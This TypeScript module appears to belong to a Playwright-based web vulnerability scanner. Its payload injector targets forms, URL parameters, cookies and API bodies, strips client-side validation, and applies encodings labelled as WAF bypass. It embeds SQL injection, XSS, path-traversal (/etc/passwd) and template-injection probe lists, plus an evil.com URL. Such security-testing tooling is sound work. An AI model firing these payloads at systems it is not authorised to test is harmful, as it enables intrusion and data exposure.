import { Logger } from '../../utils/logger/Logger';
import { LogLevel } from '../../types/enums';
import { Page } from 'playwright';
import { AttackSurface, AttackSurfaceType, InjectionContext } from './DomExplorer';

/**
 * Strategie de injecție
 */
export enum InjectionStrategy {
  APPEND = 'append',           // Adaugă payload la sfârșitul valorii
  REPLACE = 'replace',         // Înlocuiește valoarea cu payload
  PREFIX = 'prefix',           // Adaugă payload la început
  WRAP = 'wrap',              // Înconjoară valoarea cu payload
}

/**
 * Encoding pentru payload-uri
 */
export enum PayloadEncoding {
  NONE = 'none',
  URL = 'url',
  HTML = 'html',
  UNICODE = 'unicode',
  BASE64 = 'base64',
  DOUBLE_URL = 'double-url',
}

/**
 * Rezultatul unei injecții
 */
export interface InjectionResult {
  payload: string;
  encoding: PayloadEncoding;
  strategy: InjectionStrategy;
  surface: AttackSurface;
  response?: {
    url: string;
    status: number;
    body: string;
    headers: Record<string, string>;
    timing: number;
  };
  error?: string;
}

/**
 * PayloadInjector - Clasa de bază pentru injecție de payload-uri
 * Responsabilități:
 * - Injectare payload-uri în diverse contexte
 * - Encoding și obfuscation
 * - Strategii de fuzzing
 * - WAF bypass techniques
 */
export class PayloadInjector {
  protected logger: Logger;

  constructor(logLevel: LogLevel = LogLevel.INFO) {
    this.logger = new Logger(logLevel, 'PayloadInjector');
  }

  /**
   * Injectează payload într-o suprafață de atac
   */
  public async inject(
    page: Page,
    surface: AttackSurface,
    payload: string,
    options: {
      encoding?: PayloadEncoding;
      strategy?: InjectionStrategy;
      submit?: boolean;
      baseUrl?: string;
    } = {}
  ): Promise<InjectionResult> {
    const encoding = options.encoding || PayloadEncoding.NONE;
    const strategy = options.strategy || InjectionStrategy.REPLACE;
    const submit = options.submit !== undefined ? options.submit : true;

    this.logger.debug(`Injecting payload into ${surface.name} (${surface.type})`);

    // Create result object early for potential early returns
    const result: InjectionResult = {
      payload,
      encoding,
      strategy,
      surface,
    };

    // Restore state if baseUrl is provided
    if (options.baseUrl) {
      try {
        // Check if page/context is still open before attempting navigation
        if (page.isClosed()) {
          this.logger.debug('Page is closed, skipping state restoration');
          result.error = 'Page closed';
          return result; // Return early with error result
        }
        
        const currentUrl = page.url();
        // Only reload if we are not on the base URL or if we suspect state is dirty
        // For robustness, we always reload for form inputs as they likely caused navigation
        if (surface.type === AttackSurfaceType.FORM_INPUT || currentUrl !== options.baseUrl) {
           await page.goto(options.baseUrl, { waitUntil: 'domcontentloaded', timeout: 10000 });
        }
      } catch (error) {
        // Check if error is due to closed page/context
        const errorMsg = String(error);
        if (errorMsg.includes('closed') || errorMsg.includes('Target closed')) {
          this.logger.debug('Page/context closed during state restoration, aborting injection');
          result.error = 'Page/context closed';
          return result; // Return early with error result
        }
        this.logger.warn(`Failed to restore state to ${options.baseUrl}: ${error}`);
      }
    }

    try {
      // Check again before starting injection (in case page closed during state restore)
      if (page.isClosed()) {
        result.error = 'Page closed before injection';
        return result;
      }

      // 1. Encode payload
      const encodedPayload = this.encodePayload(payload, encoding);

      // 2. Apply injection strategy
      const finalPayload = this.applyStrategy(surface.value || '', encodedPayload, strategy);

      // 3. Inject based on surface type
      const startTime = Date.now();
      let apiResponse: { body: string; status: number; headers: Record<string, string> } | null = null;
      
      switch (surface.type) {
        case AttackSurfaceType.FORM_INPUT:
          await this.injectIntoFormInput(page, surface, finalPayload, submit);
          break;
        
        case AttackSurfaceType.URL_PARAMETER:
          await this.injectIntoUrlParameter(page, surface, finalPayload);
          break;
        
        case AttackSurfaceType.COOKIE:
          await this.injectIntoCookie(page, surface, finalPayload);
          break;
          
        case AttackSurfaceType.API_PARAM:
        case AttackSurfaceType.JSON_BODY:
          apiResponse = await this.injectIntoApiRequest(page, surface, finalPayload);
          break;
        
        default:
          throw new Error(`Unsupported attack surface type: ${surface.type}`);
      }

      const endTime = Date.now();

      if (apiResponse) {
        result.response = {
          url: surface.metadata.url || page.url(),
          status: apiResponse.status,
          body: apiResponse.body,
          headers: apiResponse.headers,
          timing: endTime - startTime,
        };
      } else {
        // 4. Wait for response and capture
        await page.waitForLoadState('networkidle', { timeout: 5000 }).catch(() => {});
        
        result.response = {
          url: page.url(),
          status: 200, // Will be updated from network monitoring
          body: await page.content(),
          headers: {},
          timing: endTime - startTime,
        };
      }

    } catch (error) {
      const errorMsg = String(error);
      // Silently skip closed page errors (test was aborted)
      if (errorMsg.includes('closed') || errorMsg.includes('Target closed')) {
        this.logger.debug(`Injection aborted (page closed): ${surface.name}`);
      } else {
        this.logger.debug(`Injection skipped (element unavailable): ${error}`);
      }
      result.error = errorMsg;
    }

    return result;
  }

  /**
   * Inject into API Request (XHR/Fetch)
   */
  private async injectIntoApiRequest(
    page: Page,
    surface: AttackSurface,
    payload: string
  ): Promise<{ body: string; status: number; headers: Record<string, string> }> {
    const url = surface.metadata.url;
    if (!url) {
      throw new Error('URL missing in attack surface metadata');
    }
    
    const method = (surface.metadata['method'] as string) || 'GET';
    
    let response;
    
    if (surface.type === AttackSurfaceType.API_PARAM) {
      const apiUrl = new URL(url);
      apiUrl.searchParams.set(surface.name, payload);
      response = await page.request.fetch(apiUrl.toString(), {
        method,
        headers: { 'Content-Type': 'application/json' }
      });
    } else if (surface.type === AttackSurfaceType.JSON_BODY) {
      const originalBody = surface.metadata['originalBody'];
      if (!originalBody) {
        throw new Error('Original body missing for JSON injection');
      }

      const body = JSON.parse(JSON.stringify(originalBody)); // Deep clone
      const key = surface.metadata['originalKey'] as string;
      
      if (key) {
        this.setNestedValue(body, key, payload);
      }
      
      response = await page.request.fetch(url, {
        method,
        data: body,
        headers: { 'Content-Type': 'application/json' }
      });
    }

    if (!response) throw new Error('Failed to send API request');

    return {
      body: await response.text(),
      status: response.status(),
      headers: response.headers(),
    };
  }

  /**
   * Helper to set nested JSON value
   */
  private setNestedValue(obj: any, path: string, value: any) {
    const keys = path.split('.');
    let current = obj;
    for (let i = 0; i < keys.length - 1; i++) {
      const key = keys[i];
      if (key) {
        if (!current[key]) current[key] = {};
        current = current[key];
      }
    }
    const lastKey = keys[keys.length - 1];
    if (lastKey) {
      current[lastKey] = value;
    }
  }

  /**
   * Injectează multiple payload-uri într-o suprafață
   */
  public async injectMultiple(
    page: Page,
    surface: AttackSurface,
    payloads: string[],
    options: {
      encoding?: PayloadEncoding;
      encodings?: PayloadEncoding[];
      strategy?: InjectionStrategy;
      submit?: boolean;
      delayMs?: number;
      baseUrl?: string;
    } = {}
  ): Promise<InjectionResult[]> {
    const results: InjectionResult[] = [];
    const delayMs = options.delayMs || 100;

    for (let i = 0; i < payloads.length; i++) {
      const payload = payloads[i];
      if (!payload) continue; // Skip undefined payloads
      
      const encoding = options.encodings?.[i] || options.encoding || PayloadEncoding.NONE;

      const result = await this.inject(page, surface, payload, {
        ...options,
        encoding,
      });

      results.push(result);

      // Delay between injections to avoid rate limiting
      if (i < payloads.length - 1 && delayMs > 0) {
        await this.delay(delayMs);
      }
    }

    return results;
  }

  /**
   * Encode payload based on strategy
   */
  protected encodePayload(payload: string, encoding: PayloadEncoding): string {
    switch (encoding) {
      case PayloadEncoding.URL:
        return encodeURIComponent(payload);
      
      case PayloadEncoding.DOUBLE_URL:
        return encodeURIComponent(encodeURIComponent(payload));
      
      case PayloadEncoding.HTML:
        return payload
          .replace(/&/g, '&amp;')
          .replace(/</g, '&lt;')
          .replace(/>/g, '&gt;')
          .replace(/"/g, '&quot;')
          .replace(/'/g, '&#x27;');
      
      case PayloadEncoding.UNICODE:
        return this.unicodeEncode(payload);
      
      case PayloadEncoding.BASE64:
        return Buffer.from(payload).toString('base64');
      
      case PayloadEncoding.NONE:
      default:
        return payload;
    }
  }

  /**
   * Unicode encoding for WAF bypass
   */
  private unicodeEncode(payload: string): string {
    return payload
      .split('')
      .map((char) => {
        // Randomly choose between normal, hex, and unicode encoding
        const rand = Math.random();
        if (rand < 0.7) {
          return char; // Keep normal
        } else if (rand < 0.85) {
          return `\\x${char.charCodeAt(0).toString(16).padStart(2, '0')}`; // Hex
        } else {
          return `\\u${char.charCodeAt(0).toString(16).padStart(4, '0')}`; // Unicode
        }
      })
      .join('');
  }

  /**
   * Apply injection strategy
   */
  private applyStrategy(original: string, payload: string, strategy: InjectionStrategy): string {
    switch (strategy) {
      case InjectionStrategy.APPEND:
        return original + payload;
      
      case InjectionStrategy.PREFIX:
        return payload + original;
      
      case InjectionStrategy.WRAP:
        return payload + original + payload;
      
      case InjectionStrategy.REPLACE:
      default:
        return payload;
    }
  }

  /**
   * Inject into form input
   */
  private async injectIntoFormInput(
    page: Page,
    surface: AttackSurface,
    payload: string,
    submit: boolean
  ): Promise<void> {
    // Bypass client-side validation by modifying DOM
    if (surface.element) {
      await surface.element.evaluate((el: any) => {
        el.removeAttribute('required');
        el.removeAttribute('pattern');
        el.removeAttribute('minlength');
        el.removeAttribute('maxlength');
        if (el.type === 'email' || el.type === 'url' || el.type === 'number') {
          el.type = 'text'; // Force to text to accept any payload
        }
      }).catch(() => {});
    }

    // Prioritize selector to avoid detached elements after reload
    if (surface.selector) {
      await page.fill(surface.selector, payload);
    } else if (surface.element) {
      await surface.element.fill(payload);
    } else {
      throw new Error('No element or selector available for injection');
    }

    if (submit && surface.metadata?.formAction) {
      // Find and click submit button
      const submitBtn = await page.$('button[type="submit"], input[type="submit"]');
      if (submitBtn) {
        // Force enable button
        await submitBtn.evaluate((el: any) => {
          el.removeAttribute('disabled');
          el.classList.remove('disabled');
        }).catch(() => {});
        
        await submitBtn.click({ timeout: 1000 }).catch(() => {});
      }
    }
  }

  /**
   * Inject into URL parameter
   */
  private async injectIntoUrlParameter(
    page: Page,
    surface: AttackSurface,
    payload: string
  ): Promise<void> {
    const currentUrl = new URL(page.url());
    currentUrl.searchParams.set(surface.name, payload);
    await page.goto(currentUrl.toString(), { waitUntil: 'domcontentloaded' });
  }

  /**
   * Inject into cookie
   */
  private async injectIntoCookie(
    page: Page,
    surface: AttackSurface,
    payload: string
  ): Promise<void> {
    await page.context().addCookies([
      {
        name: surface.name,
        value: payload,
        domain: surface.metadata['domain'] as string,
        path: (surface.metadata['path'] as string) || '/',
        secure: (surface.metadata['secure'] as boolean) || false,
        httpOnly: (surface.metadata['httpOnly'] as boolean) || false,
        sameSite: (surface.metadata['sameSite'] as 'Strict' | 'Lax' | 'None') || 'Lax',
      },
    ]);
    
    // Reload page to apply cookie
    await page.reload({ waitUntil: 'domcontentloaded' });
  }

  /**
   * Generate fuzzing payloads based on context
   */
  public generateFuzzingPayloads(context: InjectionContext, count: number = 10): string[] {
    const payloads: string[] = [];

    switch (context) {
      case InjectionContext.SQL:
        payloads.push(...this.getSqlFuzzPayloads().slice(0, count));
        break;
      
      case InjectionContext.HTML:
      case InjectionContext.JAVASCRIPT:
        payloads.push(...this.getXssFuzzPayloads().slice(0, count));
        break;
      
      case InjectionContext.URL:
        payloads.push(...this.getUrlFuzzPayloads().slice(0, count));
        break;
      
      default:
        payloads.push(...this.getGenericFuzzPayloads().slice(0, count));
    }

    return payloads;
  }

  /**
   * SQL fuzzing payloads
   */
  private getSqlFuzzPayloads(): string[] {
    return [
      "'", '"', '`',
      "' OR '1'='1", "' OR 1=1--", "' OR 'a'='a",
      "admin'--", "admin' #", "admin'/*",
      "' UNION SELECT NULL--",
      "' AND SLEEP(5)--",
      "1' AND '1'='2",
    ];
  }

  /**
   * XSS fuzzing payloads
   */
  private getXssFuzzPayloads(): string[] {
    return [
      '<script>alert(1)</script>',
      '<img src=x onerror=alert(1)>',
      '<svg/onload=alert(1)>',
      'javascript:alert(1)',
      '<iframe src="javascript:alert(1)">',
      '"><script>alert(1)</script>',
      "'-alert(1)-'",
      '<body onload=alert(1)>',
    ];
  }

  /**
   * URL fuzzing payloads
   */
  private getUrlFuzzPayloads(): string[] {
    return [
      '../../../etc/passwd',
      '....//....//....//etc/passwd',
      '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
      'file:///etc/passwd',
      'http://evil.com',
    ];
  }

  /**
   * Generic fuzzing payloads
   */
  private getGenericFuzzPayloads(): string[] {
    return [
      'A'.repeat(1000),           // Buffer overflow
      '%00',                       // Null byte
      '${7*7}',                   // Template injection
      '{{7*7}}',                  // Template injection
      '\x00\x01\x02',            // Binary data
      '../../../',                // Path traversal
      '<>"\';',                   // Special characters
    ];
  }

  /**
   * Delay helper
   */
  private delay(ms: number): Promise<void> {
    return new Promise((resolve) => setTimeout(resolve, ms));
  }
}
